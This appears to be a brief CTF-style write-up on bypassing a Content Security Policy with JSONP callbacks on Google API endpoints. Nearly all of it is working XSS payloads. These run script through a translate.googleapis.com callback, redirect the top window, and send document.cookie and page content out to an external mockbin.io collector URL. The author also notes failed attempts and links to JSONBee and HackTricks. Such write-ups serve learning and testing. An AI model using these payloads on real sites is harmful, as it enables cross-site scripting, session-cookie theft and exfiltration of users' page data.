# CSP - JSONP

## Initial Attempt

```javascript
<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert`1`"></script>
```

Problem: Cannot quite control the argument easily

Achieve XSS by using one of the googleapi payloads from JSONBee

```javascript
<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert('xss');"></script>
```

## Solution

Achieve redirection by defining your own function in the callback parameter

```javascript
<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=(function exploit(){window.top.location.href='https://google.com'})()"></script>
```

```javascript
<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=(function exploit(){window.top.location.href='https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/?'.concat(document.cookie)})()"></script>
```

Problem: we need to exfiltrate the page not the cookie

```javascript
<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=(function exploit(){var p=document.getElementsByTagName('p')[0];window.top.location.href='https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/?'.concat(p)})()"></script>
```

Problem: script works but returns a `400 INVALID_ARGUMENT` error when appending `.innerText` to get the content of page

## References

- [JSONBee - ready to use JSONP endpoints](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
- [Hacktricks - third party jsonp endpoints](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#third-party-endpoints--jsonp)
